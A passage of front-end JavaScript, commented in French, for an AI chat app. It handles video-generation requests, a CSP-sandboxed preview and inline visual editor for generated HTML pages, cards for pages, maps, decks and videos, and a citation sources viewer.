        if (videoOptions.size)    fd.append('video_size', videoOptions.size);
        if (videoOptions.format)  fd.append('video_format', videoOptions.format);
    }

    // Image de référence pour la génération vidéo
    if (videoOptions?.image?.file instanceof File && videoOptions.image.role !== 'none') {
        fd.append('video_image', videoOptions.image.file);
        fd.append('video_image_role', videoOptions.image.role);
    }

    await startJob(`/chat/${cid}/generate-video`, fd, {
        type: 'video',
        convId: cid,
        el: assistantEl,
        onQuota: () => {
            assistantEl.closest('.message')?.remove();
            closeVideoViewer();
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
        onError: (err) => {
            closeVideoViewer();
            renderInlineError(assistantEl, {
                kind: 'generic',
                title: t('Génération impossible'),
                message: err && err.message ? err.message : t('La vidéo n\'a pas pu être générée. Réessayez.'),
            });
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
    });
}

function cleanHtmlCode(raw) {
    let s = String(raw || '').trim();

    // Mode modification : le résumé des ajustements (RESUME_MODIFICATIONS)
    // voyage après </html>. Le serveur le retire avant persistance ; ce filet
    // couvre le flux brut encore en mémoire côté client.
    const sumM = s.match(/[*_]{0,3}R[ÉE]SUM[ÉE]?[ _]MODIFICATIONS[\s*_]*:/i);
    if (sumM && !/<html\b|<!doctype\s+html\b/i.test(s.slice(sumM.index + sumM[0].length))) {
        s = s.slice(0, sumM.index).trim();
    }

    const fenced = s.match(/```(?:html|htm)?\s*([\s\S]*?)\s*```/i);
    if (fenced && fenced[1]) {
        s = fenced[1].trim();
    } else {
        s = s.replace(/^```(?:html|htm)?\s*/i, '');
        s = s.replace(/\s*```\s*$/i, '');
    }

    const doctypeMatch = s.match(/<!doctype\s+html\b[\s\S]*$/i);
    if (doctypeMatch) {
        s = doctypeMatch[0].trim();
    }
    const htmlDocMatch = s.match(/<html\b[\s\S]*<\/html>/i);
    if (htmlDocMatch) {
        s = htmlDocMatch[0].trim();
    }

    if (!/^\s*</.test(s)) {
        const firstTagPos = s.indexOf('<');
        if (firstTagPos >= 0) {
            s = s.slice(firstTagPos).trim();
        }
    }

    return s.trim();
}

const HTML_PREVIEW_GUARD_STYLE = `<style id="myllm-preview-guard" data-mia-editor>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    max-width: 100%;
    overflow-x: hidden;
}
*, *::before, *::after {
    box-sizing: border-box;
}
body {
    overflow-wrap: break-word;
}
img, video, canvas, svg, iframe {
    max-width: 100%;
    height: auto;
}
pre {
    max-width: 100%;
    overflow: auto;
}
</style>`;

// Étanchéité réseau de l'aperçu : la page tourne dans une iframe sandboxée (origine
// opaque, déjà isolée du DOM de l'app). La CSP scelle les CANAUX D'EXFILTRATION
// (connect-src 'none' → pas de fetch/XHR/WebSocket ; form-action 'none' ; base-uri
// 'none' ; img-src verrouillé sur les images générées PAR MIA + data:/blob: → pas de
// beacon image vers un tiers ; pas d'allow-top-navigation sur la sandbox). En revanche
// on AUTORISE le chargement de feuilles de style / scripts / polices depuis une courte
// liste de CDN statiques de confiance (Tailwind, jsDelivr, cdnjs, unpkg, Google Fonts) :
// les LLM produisent fréquemment des pages qui en dépendent, et sans ça le CSS n'était
// pas chargé → page nue dans le volet droit. Ces CDN ne servent que des assets publics
// et ne reçoivent aucune donnée utilisateur (connect-src reste 'none'). Injectée
// UNIQUEMENT dans l'aperçu : le HTML téléchargé reste fidèle (images ré-embarquées en
// data-URI côté serveur). img-src accepte aussi https: : l'éditeur de l'aperçu permet
// d'insérer une image par URL externe — les canaux actifs (connect-src, form-action)
// restent scellés. Les nœuds injectés portent data-mia-editor → retirés par l'éditeur
// avant sauvegarde (le HTML persisté reste fidèle).
// NB : la page de partage (share.js), la galerie « Mes créations » (creations.js) et
// l'aperçu des pages web d'un workflow (html-preview.js : historique, exécution)
// répliquent GUARD_STYLE + CSP — à synchroniser.
const HTML_PREVIEW_CDN = 'https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com';
const HTML_PREVIEW_CSP = `<meta http-equiv="Content-Security-Policy" data-mia-editor content="default-src 'none'; img-src ${location.origin}/assets/img/generated/ https: data: blob:; font-src data: https://fonts.gstatic.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'unsafe-inline' data: https://fonts.googleapis.com ${HTML_PREVIEW_CDN}; script-src 'unsafe-inline' 'unsafe-eval' blob: ${HTML_PREVIEW_CDN}; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'">`;

function ensureHtmlPreviewGuards(rawHtml) {
    let doc = String(rawHtml || '').trim();
    const baseHead = '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">';

    if (!doc) {
        return `<!DOCTYPE html><html><head>${HTML_PREVIEW_CSP}${baseHead}${HTML_PREVIEW_GUARD_STYLE}</head><body></body></html>`;
    }

    if (!/<html\b/i.test(doc)) {
        return `<!DOCTYPE html><html><head>${HTML_PREVIEW_CSP}${baseHead}${HTML_PREVIEW_GUARD_STYLE}</head><body>${doc}</body></html>`;
    }

    if (!/<!doctype\s+html\b/i.test(doc)) {
        doc = `<!DOCTYPE html>\n${doc}`;
    }

    if (!/<head\b/i.test(doc)) {
        doc = doc.replace(/<html\b([^>]*)>/i, `<html$1><head>${HTML_PREVIEW_CSP}${baseHead}${HTML_PREVIEW_GUARD_STYLE}</head>`);
    } else {
        if (!/<meta[^>]+charset\s*=\s*["']?utf-8["']?/i.test(doc)) {
            doc = doc.replace(/<head\b[^>]*>/i, '$&<meta charset="UTF-8">');
        }
        if (!/<meta[^>]+name\s*=\s*["']viewport["']/i.test(doc)) {
            doc = doc.replace(/<head\b[^>]*>/i, '$&<meta name="viewport" content="width=device-width, initial-scale=1.0">');
        }
        if (!/id=(["'])myllm-preview-guard\1/i.test(doc)) {
            doc = doc.replace(/<head\b[^>]*>/i, `$&${HTML_PREVIEW_GUARD_STYLE}`);
        }
        // Injectée en dernier → se retrouve juste après <head> (gouverne tout ce qui suit).
        if (!/http-equiv\s*=\s*["']content-security-policy["']/i.test(doc)) {
            doc = doc.replace(/<head\b[^>]*>/i, `$&${HTML_PREVIEW_CSP}`);
        }
    }

    if (!/<body\b/i.test(doc)) {
        if (/<\/head>/i.test(doc)) {
            doc = doc.replace(/<\/head>/i, '</head><body>');
        }
        if (!/<\/body>/i.test(doc)) {
            doc += '</body>';
        }
    }

    if (!/<\/html>/i.test(doc)) {
        doc += '</html>';
    }

    return doc;
}

// Tout document HTML chargé via blob: (aperçu ET nouvel onglet) a pour base l'URL blob:
// (origine opaque) : un chemin absolu /assets/img/generated/… n'y résout PAS vers l'origine
// de l'app → blob: invalide → image cassée. On réécrit donc les images générées par MIA en
// URL absolue (servies statiquement par l'app, sans auth). Le HTML stocké/téléchargé reste
// inchangé (download = images ré-embarquées en data-URI côté serveur).
function absolutizeGeneratedAssets(html) {
    return String(html || '').replace(
        /(\s(?:src|srcset)\s*=\s*["'])\/assets\/img\/generated\//gi,
        '$1' + location.origin + '/assets/img/generated/'
    );
}

// Inverse d'absolutize AVANT persistance : retire l'origine absolue ET la query
// de signature (?e=&s=, cf. MediaUrl côté serveur). Un aperçu blob: charge des
// URL signées expirantes ; les stocker figerait une signature morte dans le
// contenu — au prochain rendu, signHtmlAssets ne re-signerait pas un chemin déjà
// « queried » (garde d'idempotence) et l'image casserait passé le TTL. Le `&`
// d'une URL signée est sérialisé en `&amp;` par le DOM de l'éditeur : les deux
// formes sont tolérées. Le contenu stocké reste des chemins relatifs canoniques.
function relativizeGeneratedAssets(html) {
    return String(html || '')
        .split(location.origin + '/assets/img/generated/').join('/assets/img/generated/')
        .replace(
            /(\/assets\/(?:img|video)\/generated\/[A-Za-z0-9._-]+)\?e=\d+&(?:amp;)?s=[a-f0-9]+/gi,
            '$1'
        );
}

// =========================================================
// ÉDITEUR VISUEL DE L'APERÇU (mode « Éditer »)
// =========================================================
// Marque les <style>/<script>/<link> D'ORIGINE de la page. À la sauvegarde, l'éditeur
// ne conserve que ceux-là : les feuilles injectées au RUNTIME (ex. Tailwind Play CDN
// génère un <style> au chargement) seraient sinon dupliquées à chaque cycle d'édition.
// DOMParser est inerte (aucun script exécuté, pas d'injection pendant le parse).
function annotateOriginalAssets(html) {
    try {
        const doc = new DOMParser().parseFromString(html, 'text/html');
        doc.querySelectorAll('style, script, link').forEach((n) => n.setAttribute('data-mia-keep', ''));
        return '<!DOCTYPE html>\n' + doc.documentElement.outerHTML;
    } catch (_) {
        return html;
    }
}

// Code exécuté DANS l'iframe d'aperçu (sérialisé via toString puis injecté en <script>
// inline — autorisé par la CSP). Il ne doit référencer AUCUNE variable de chat.js.
// Dialogue avec le parent par postMessage (origine opaque → targetOrigin '*', aucun
// secret ne transite). La sandbox n'a pas allow-modals : prompt() est inerte, la saisie
// d'URL de lien se fait donc dans un mini-champ du menu flottant.
function miaPreviewEditor() {
    'use strict';
    var SEL = 'p,h1,h2,h3,h4,h5,h6,li,td,th,blockquote,figcaption,label,dt,dd,a,button,strong,em,b,i,small,cite,q,span,img';
    var editOn = false;
    var selected = null;
    var hovered = null;
    var saveTimer = null;
    var menu = null;
    var urlRow = null;
    var urlInput = null;

    function post(msg) { try { window.parent.postMessage(msg, '*'); } catch (e) {} }

    // Reconstruit le HTML « propre » : sans l'outillage éditeur/aperçu, sans les
    // styles/scripts injectés au runtime, sans les attributs d'état d'édition.
    function serialize() {
        var root = document.documentElement.cloneNode(true);
        root.querySelectorAll('[data-mia-editor]').forEach(function (n) { n.remove(); });
        root.querySelectorAll('style:not([data-mia-keep]), script:not([data-mia-keep]), link:not([data-mia-keep])')
            .forEach(function (n) { n.remove(); });
        root.querySelectorAll('[data-mia-keep]').forEach(function (n) { n.removeAttribute('data-mia-keep'); });
        root.querySelectorAll('[contenteditable]').forEach(function (n) { n.removeAttribute('contenteditable'); });
        root.querySelectorAll('.mia-edit-hover, .mia-edit-selected').forEach(function (n) {
            n.classList.remove('mia-edit-hover');
            n.classList.remove('mia-edit-selected');
            if (!n.getAttribute('class')) n.removeAttribute('class');
        });
        return '<!DOCTYPE html>\n' + root.outerHTML;
    }

    function scheduleSave() {
        clearTimeout(saveTimer);
        saveTimer = setTimeout(function () {
            post({ type: 'mia-html-changed', html: serialize() });
        }, 800);
    }

    function makeBtn(label, title, extraClass, onClick) {
        var b = document.createElement('button');
        b.type = 'button';
        b.className = 'mia-btn' + (extraClass ? ' ' + extraClass : '');
        b.textContent = label;
        b.title = title;
        b.addEventListener('click', function (e) {
            e.preventDefault();
            e.stopPropagation();
            onClick();
        });
        return b;
    }

    // Applique une commande de mise en forme à la sélection courante ; si aucune
    // sélection dans l'élément, agit sur tout son contenu.
    function exec(cmd) {
        if (!selected || selected.tagName === 'IMG') return;
        var sel = document.getSelection();
        if (!sel || sel.isCollapsed || !selected.contains(sel.anchorNode)) {
            var r = document.createRange();
            r.selectNodeContents(selected);
            sel.removeAllRanges();
            sel.addRange(r);
        }
        document.execCommand(cmd, false, null);
        scheduleSave();
    }

    function hideUrlRow() {
        if (urlRow) urlRow.classList.remove('open');
    }

    function toggleUrlRow() {
        if (!urlRow || !selected) return;
        if (urlRow.classList.contains('open')) { hideUrlRow(); return; }
        var link = selected.tagName === 'A' ? selected : selected.querySelector('a');
        urlInput.value = link ? (link.getAttribute('href') || '') : '';
        urlRow.classList.add('open');
        urlInput.focus();
    }

    function applyLink() {
        if (!selected) return;
        var url = (urlInput.value || '').trim();
        if (url === '') { hideUrlRow(); return; }
        if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
        if (selected.tagName === 'A') {
            selected.setAttribute('href', url);
        } else {
            var sel = document.getSelection();
            if (!sel || sel.isCollapsed || !selected.contains(sel.anchorNode)) {
                var r = document.createRange();
                r.selectNodeContents(selected);
                sel.removeAllRanges();
                sel.addRange(r);
            }
            document.execCommand('createLink', false, url);
        }
        hideUrlRow();
        scheduleSave();
    }

    function buildMenu() {
        menu = document.createElement('div');
        menu.id = 'mia-editor-menu';
        menu.setAttribute('data-mia-editor', '');
        // preventDefault sur mousedown : conserve la sélection de texte quand on
        // clique un bouton (sauf sur le champ URL, qui doit prendre le focus).
        menu.addEventListener('mousedown', function (e) {
            if (e.target.tagName !== 'INPUT') e.preventDefault();
            e.stopPropagation();
        });

        var row = document.createElement('div');
        row.className = 'mia-row';
        var bBold = makeBtn('B', t('Gras'), 'mia-text-only', function () { exec('bold'); });
        bBold.style.fontWeight = '700';
        var bItalic = makeBtn('I', t('Italique'), 'mia-text-only', function () { exec('italic'); });
        bItalic.style.fontStyle = 'italic';
        row.appendChild(bBold);
        row.appendChild(bItalic);
        row.appendChild(makeBtn('Normal', t('Retirer la mise en forme'), 'mia-text-only', function () { exec('removeFormat'); }));
        row.appendChild(makeBtn('🔗', t('Lien hypertexte'), 'mia-text-only', toggleUrlRow));
        row.appendChild(makeBtn('🖼️', t('Insérer une image après cet élément'), 'mia-text-only', function () {
            post({ type: 'mia-request-image', mode: 'insert' });
        }));
        row.appendChild(makeBtn('Remplacer', t('Remplacer cette image'), 'mia-img-only', function () {
            post({ type: 'mia-request-image', mode: 'replace' });
        }));
        row.appendChild(makeBtn(t('Supprimer'), t('Supprimer cette image'), 'mia-img-only', function () {
            if (selected && selected.tagName === 'IMG') {
                var img = selected;
                deselect(true);
                img.remove();
                scheduleSave();
            }
        }));
        menu.appendChild(row);

        urlRow = document.createElement('div');
        urlRow.className = 'mia-url-row';
        urlInput = document.createElement('input');
        urlInput.type = 'text';
        urlInput.placeholder = 'https://exemple.com';
        urlInput.addEventListener('keydown', function (e) {
            e.stopPropagation();
            if (e.key === 'Enter') { e.preventDefault(); applyLink(); }
            if (e.key === 'Escape') hideUrlRow();
        });
        urlRow.appendChild(urlInput);
        urlRow.appendChild(makeBtn('OK', t('Appliquer le lien'), '', applyLink));
        menu.appendChild(urlRow);

        document.body.appendChild(menu);
    }

    function placeMenu(el) {
        menu.style.display = 'block';
        var rect = el.getBoundingClientRect();
        var top = rect.top - menu.offsetHeight - 8;
        if (top < 4) top = Math.min(rect.bottom + 8, window.innerHeight - menu.offsetHeight - 4);
        var left = Math.max(4, Math.min(rect.left, window.innerWidth - menu.offsetWidth - 4));
        menu.style.top = Math.max(4, top) + 'px';
        menu.style.left = left + 'px';
    }

    function clearHover() {
        if (hovered) {
            hovered.classList.remove('mia-edit-hover');
            if (!hovered.getAttribute('class')) hovered.removeAttribute('class');
            hovered = null;
        }
    }

    function deselect(hideMenu) {
        if (selected) {
            selected.removeAttribute('contenteditable');
            selected.classList.remove('mia-edit-selected');
            if (!selected.getAttribute('class')) selected.removeAttribute('class');
            selected = null;
        }
        if (hideMenu && menu) { menu.style.display = 'none'; hideUrlRow(); }
    }

    function select(el) {
        deselect(false);
        clearHover();
        selected = el;
        el.classList.add('mia-edit-selected');
        var isImg = el.tagName === 'IMG';
        menu.querySelectorAll('.mia-text-only').forEach(function (b) { b.style.display = isImg ? 'none' : ''; });
        menu.querySelectorAll('.mia-img-only').forEach(function (b) { b.style.display = isImg ? '' : 'none'; });
        hideUrlRow();
        if (!isImg) {
            el.setAttribute('contenteditable', 'true');
            el.focus();
        }
        placeMenu(el);
    }

    function insertImage(url, mode) {
        if (mode === 'replace' && selected && selected.tagName === 'IMG') {
            selected.setAttribute('src', url);
            selected.removeAttribute('srcset');
        } else {
            var img = document.createElement('img');
            img.src = url;
            img.alt = '';
            img.style.maxWidth = '100%';
            if (selected) selected.insertAdjacentElement('afterend', img);
            else document.body.appendChild(img);
        }
        scheduleSave();
    }

    function setEditMode(on) {
        editOn = !!on;
        if (!editOn) {
            deselect(true);
            clearHover();
        }
        document.documentElement.classList.toggle('mia-editing', editOn);
    }

    function targetOf(e) {
        var cible = e.target;
        return (cible && cible.closest && !menu.contains(cible)) ? cible.closest(SEL) : null;
    }

    document.addEventListener('mouseover', function (e) {
        if (!editOn) return;
        var el = targetOf(e);
        if (hovered && hovered !== el) clearHover();
        if (el && el !== selected && el !== hovered) {
            hovered = el;
            el.classList.add('mia-edit-hover');
        }
    }, true);

    document.addEventListener('mouseout', function (e) {
        if (!editOn || !hovered) return;
        if (targetOf(e) === hovered && !hovered.contains(e.relatedTarget)) clearHover();
    }, true);

    // Capture : neutralise liens/boutons de la page en mode édition, sélectionne l'élément.
    document.addEventListener('click', function (e) {
        if (!editOn) return;
        if (menu.contains(e.target)) return;
        e.preventDefault();
        e.stopPropagation();
        var el = targetOf(e);
        if (!el) { deselect(true); return; }
        if (el !== selected) select(el);
        else placeMenu(el);
    }, true);

    document.addEventListener('submit', function (e) {
        if (editOn) { e.preventDefault(); e.stopPropagation(); }
    }, true);

    document.addEventListener('input', function () {
        if (editOn) scheduleSave();
    });

    window.addEventListener('scroll', function () {
        if (editOn && selected && menu && menu.style.display === 'block') placeMenu(selected);
    }, true);

    window.addEventListener('message', function (e) {
        var d = e && e.data ? e.data : {};
        if (d.type === 'mia-edit-mode') setEditMode(!!d.on);
        else if (d.type === 'mia-insert-image' && typeof d.url === 'string') insertImage(d.url, d.mode);
    });

    function init() {
        buildMenu();
        post({ type: 'mia-editor-ready' });
    }
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
    else init();
}

const HTML_PREVIEW_EDITOR_STYLE = `<style data-mia-editor>
.mia-edit-hover { outline: 2px dashed #7c3aed !important; outline-offset: 2px; cursor: pointer; }
.mia-edit-selected { outline: 2px solid #7c3aed !important; outline-offset: 2px; }
html.mia-editing a { cursor: default; }
#mia-editor-menu { position: fixed; z-index: 2147483647; display: none; background: #1f2937; color: #f9fafb; border-radius: 8px; box-shadow: 0 4px 16px rgba(0,0,0,.35); padding: 4px; font: 13px/1.4 system-ui, sans-serif; }
#mia-editor-menu .mia-row { display: flex; gap: 2px; align-items: center; }
#mia-editor-menu .mia-btn { background: transparent; color: inherit; border: 0; border-radius: 5px; padding: 4px 8px; cursor: pointer; font: inherit; white-space: nowrap; }
#mia-editor-menu .mia-btn:hover { background: rgba(255,255,255,.14); }
#mia-editor-menu .mia-url-row { display: none; margin-top: 4px; gap: 2px; }
#mia-editor-menu .mia-url-row.open { display: flex; }
#mia-editor-menu .mia-url-row input { flex: 1; min-width: 220px; border: 0; border-radius: 5px; padding: 4px 6px; font: inherit; color: #111827; background: #f9fafb; }
</style>`;
const HTML_PREVIEW_EDITOR_SCRIPT = '<scr' + 'ipt data-mia-editor>(' + miaPreviewEditor.toString() + ')();</scr' + 'ipt>';

function buildHtmlPreviewDoc(html, editable) {
    let raw = cleanHtmlCode(String(html || ''));
    if (editable) raw = annotateOriginalAssets(raw);
    raw = absolutizeGeneratedAssets(raw);
    let doc = ensureHtmlPreviewGuards(raw);
    if (editable) {
        doc = doc.replace(/<\/body>/i, () => HTML_PREVIEW_EDITOR_STYLE + HTML_PREVIEW_EDITOR_SCRIPT + '</body>');
    }
    return doc;
}

/**
 * La conversation affichée contient-elle une page HTML générée ?
 * (mode itération : le serveur repart TOUJOURS de la dernière page —
 * GeneratedHtml::latestForConversation — dès qu'une page existe.)
 */
function conversationHasGeneratedHtml() {
    return !!document.querySelector('#chatMessages .message-assistant .btn-open-html-viewer');
}

/**
 * Aligne la pastille d'outil sur la conversation affichée (chargement de page,
 * changement de conversation). Deux sources, dans cet ordre :
 *   1. le choix mémorisé pour CETTE conversation — il fait foi, quel que soit
 *      le type d'outil ;
 *   2. à défaut seulement, le mode itération d'une page HTML : une
 *      conversation qui porte déjà une page générée arme l'outil Page HTML,
 *      même sans mémoire locale (conversation menée depuis un autre appareil).
 * Sans l'un ni l'autre, la pastille de la conversation précédente est retirée.
 */
function syncToolForConversation() {
    if (window.restoreToolForConversation?.()) return;
    if (conversationHasGeneratedHtml()) window.armToolFromPicker?.(['html', 'html_illustrated']);
    else window.clearSelectedTool?.();
}

function buildHtmlCard(msgId, htmlSize) {
    const sizeKo = (htmlSize / 1024).toFixed(1);
    return `<div class="msg-html-card">
        <div class="msg-html-card-icon">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
        </div>
        <div class="msg-html-card-info">
            <span class="msg-html-card-name">page.html</span>
            <span style="color:var(--text-muted);font-size:11px">${sizeKo} Ko</span>
        </div>
        <div class="msg-html-card-actions">
            <button class="btn-open-html-viewer btn-secondary" data-msg-id="${msgId || ''}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Ouvrir
            </button>
            <button class="btn-download-html btn-secondary" data-msg-id="${msgId || ''}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Télécharger
            </button>
            <button class="btn-open-html-external btn-secondary" data-msg-id="${msgId || ''}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>Fenêtre
            </button>
            ${buildShareCreationBtn(msgId)}
        </div>
    </div>`;
}

// Icône + bouton « Partager » des cartes de créations (lien unique /share/{token}).
const SHARE_CREATION_SVG = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>';

function buildShareCreationBtn(msgId, token) {
    const jeton = token || '';
    return `<button class="btn-share-creation btn-secondary${jeton ? ' shared' : ''}" data-msg-id="${msgId || ''}" data-share-token="${escHtml(jeton)}"
        title="${escHtml(t('Partager par lien (visible uniquement par les utilisateurs connectés)'))}" style="font-size:12px;padding:4px 10px">${SHARE_CREATION_SVG}${escHtml(jeton ? t('Partagé') : t('Partager'))}</button>`;
}

function buildMapCard(msgId, spec) {
    const title = escHtml((spec && spec.title) || t('Itinéraire'));
    const steps = (spec && Array.isArray(spec.waypoints)) ? spec.waypoints.length : 0;
    return `<div class="msg-html-card msg-map-card">
        <div class="msg-html-card-icon">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="1 6 8 3 16 6 23 3 23 18 16 21 8 18 1 21"/><line x1="8" y1="3" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="21"/></svg>
        </div>
        <div class="msg-html-card-info">
            <span class="msg-html-card-name">🗺 ${title}</span>
            <span style="color:var(--text-muted);font-size:11px">${steps} étape${steps > 1 ? 's' : ''}</span>
        </div>
        <div class="msg-html-card-actions">
            <button class="btn-open-map-viewer btn-secondary" data-msg-id="${msgId || ''}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Ouvrir la carte
            </button>
            ${buildShareCreationBtn(msgId)}
        </div>
    </div>`;
}

/** Carte de création d'une présentation (parité avec le rendu serveur message.php). */
function buildDeckCard(msgId, spec) {
    const title = escHtml((spec && spec.title) || t('Présentation'));
    const count = (spec && Array.isArray(spec.slides)) ? spec.slides.length : 0;
    return `<div class="msg-html-card msg-deck-card">
        <div class="msg-html-card-icon">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="13" rx="2"/><path d="M8 21h8M12 16v5"/></svg>
        </div>
        <div class="msg-html-card-info">
            <span class="msg-html-card-name">📊 ${title}</span>
            <span style="color:var(--text-muted);font-size:11px">${count} slide${count > 1 ? 's' : ''}</span>
        </div>
        <div class="msg-html-card-actions">
            <button class="btn-open-deck btn-secondary" data-msg-id="${msgId || ''}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Ouvrir
            </button>
            ${buildShareCreationBtn(msgId)}
        </div>
    </div>`;
}

function buildVideoMetaText(meta) {
    if (!meta) return '';
    const parts = [];
    if (meta.model) parts.push(meta.model);
    if (meta.seconds) parts.push(`${meta.seconds}s`);
    if (meta.size) parts.push(meta.size);
    if (meta.format) parts.push(String(meta.format).toUpperCase());
    return parts.join(' · ');
}

function buildVideoCard(msgId, videoUrl, metaText, filename) {
    const safeName = escHtml(filename || 'video.mp4');
    return `<div class="msg-video-card">
        <div class="msg-video-card-icon">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><polygon points="10 9 16 12 10 15"/></svg>
        </div>
        <div class="msg-video-card-info">
            <span class="msg-video-card-name">${safeName}</span>
            <span style="color:var(--text-muted);font-size:11px">${escHtml(metaText || t('Vidéo MP4'))}</span>
        </div>
        <div class="msg-video-card-actions">
            <button class="btn-open-video-viewer btn-secondary" data-msg-id="${msgId || ''}" data-video-url="${escHtml(videoUrl || '')}" data-filename="${safeName}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><rect x="2" y="4" width="20" height="16" rx="2"/><polygon points="10 9 16 12 10 15"/></svg>Ouvrir
            </button>
            <button class="btn-download-video btn-secondary" data-msg-id="${msgId || ''}" data-video-url="${escHtml(videoUrl || '')}" data-filename="${safeName}" style="font-size:12px;padding:4px 10px">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:3px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Télécharger
            </button>
            ${buildShareCreationBtn(msgId)}
        </div>
    </div>`;
}

function isSonarProConversation() {
    return String(llmSelect?.value || '').trim().toLowerCase() === 'perplexity::sonar-pro';
}

function normalizeHttpUrl(url) {
    const value = String(url || '').trim();
    if (!/^https?:\/\//i.test(value)) return '';
    return value;
}

function citationDomain(url) {
    try {
        return new URL(url).hostname || url;
    } catch (e) {
        return url;
    }
}

function collectCitationItemsFromMessage(messageEl) {
    if (!messageEl) return [];

    const dedup = new Map();
    messageEl.querySelectorAll('.msg-content a.citation-link[href]').forEach((a) => {
        const idxRaw = Number(a.dataset.citationIndex || 0);
        const index = Number.isFinite(idxRaw) && idxRaw > 0 ? idxRaw : null;
        const url = normalizeHttpUrl(a.getAttribute('href') || '');
        if (!index || !url) return;

        const key = `${index}|${url}`;
        if (!dedup.has(key)) {
            dedup.set(key, { index, url, domain: citationDomain(url) });
        }
    });

    return Array.from(dedup.values()).sort((a, b) => a.index - b.index);
}

function setSourcesViewerSelection(index) {
    const selected = currentSourceItems.find((item) => item.index === index) || null;
    currentSourceSelectedIndex = selected ? selected.index : null;
    currentSourceSelectedUrl = selected ? selected.url : '';

    document.querySelectorAll('#sourcesViewerList .sources-viewer-item').forEach((el) => {
        const itemIndex = Number(el.dataset.index || 0);
        el.classList.toggle('active', itemIndex === currentSourceSelectedIndex);
    });

    const openBtn = document.getElementById('sourcesViewerOpen');
    if (openBtn) openBtn.disabled = !currentSourceSelectedUrl;
}

function renderSourcesViewer(items, preferredIndex = null) {
    const emptyEl = document.getElementById('sourcesViewerEmpty');
    const listEl = document.getElementById('sourcesViewerList');
    const countEl = document.getElementById('sourcesViewerCount');
    const openBtn = document.getElementById('sourcesViewerOpen');
    const copyBtn = document.getElementById('sourcesViewerCopy');
    if (!emptyEl || !listEl) return;

    currentSourceItems = Array.isArray(items) ? items : [];
    const hasItems = currentSourceItems.length > 0;

    if (!hasItems) {
        listEl.style.display = 'none';
        listEl.innerHTML = '';
        emptyEl.style.display = '';
        currentSourceSelectedIndex = null;
        currentSourceSelectedUrl = '';
        if (countEl) countEl.textContent = '0';
        if (openBtn) openBtn.disabled = true;
        if (copyBtn) copyBtn.disabled = true;
        return;
    }

    const fallbackIndex = currentSourceItems[0].index;
    const activeIndex = Number(preferredIndex || fallbackIndex) || fallbackIndex;
    const html = currentSourceItems.map((item) => {
        const activeClass = item.index === activeIndex ? ' active' : '';
        return `<button type="button" class="sources-viewer-item${activeClass}" data-index="${item.index}" data-url="${escAttr(item.url)}">
            <div class="sources-viewer-item-row">
                <span class="sources-viewer-index">[${item.index}]</span>
                <span class="sources-viewer-domain">${escHtml(item.domain)}</span>
            </div>
            <div class="sources-viewer-url">${escHtml(item.url)}</div>
        </button>`;
    }).join('');

    listEl.innerHTML = html;
    listEl.style.display = '';
    emptyEl.style.display = 'none';
    if (countEl) countEl.textContent = String(currentSourceItems.length);
